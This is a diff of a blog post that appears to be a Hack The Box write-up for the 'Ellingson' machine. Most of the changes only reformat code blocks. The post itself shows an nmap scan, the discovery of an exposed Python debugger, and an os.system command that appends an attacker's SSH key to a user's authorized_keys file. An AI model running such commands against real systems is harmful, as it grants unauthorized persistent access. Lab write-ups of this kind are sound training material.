@@ -10,7 +10,7 @@ Ellingson was an awesome box to root! Not only did I get to sharpen some of my R
 
 First off, I ran nmap against the box
 
-~~~ bash
+{% highlight bash lineos %}
 nmap -sV -O 10.10.10.139
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-22 10:15 CDT
 Nmap scan report for 10.10.10.139
@@ -20,17 +20,19 @@ PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    nginx 1.14.0 (Ubuntu)
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%),
+Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A
+or 211 Network Camera (Linux 2.6.17) (87%)
 No exact OS matches for host (test conditions non-ideal).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
-~~~
+{% endhighlight %}
 
 Once I was able to identify what services were running, I hopped on over to the website and began to poke around while running gobuster. When I got to the /articles/ directory, I noticed the numbers incremented and so manually fuzzed. Fuzzing http://10.10.10.139/articles/5 was able to find python interactive shells. There, I had access to a python debugger!
 
-{% highlight %}
+{% highlight bash lineos %}
 File "/opt/corp-web/run.py", line 32, in show_articles
 slug = articles[index-1]
 
@@ -41,7 +43,7 @@ hal
 
 Nice! I found I have the ability to run os system commands. During enumeration, I also found that there is Port 22 open. First, I tried to steal the SSH key, but I did not know the key passphrase. However, looking further, I can write to the authorized_keys file! Since taking the id_rsa key file on there didn’t work, let’s generate a new key, and place our pub key in there:
 
-{% highlight %}
+{% highlight bash lineos %}
 import os
 
 os.system("echo '\nssh-rsa [your RSA key] root@kali' >> /home/hal/.ssh/authorized_keys")
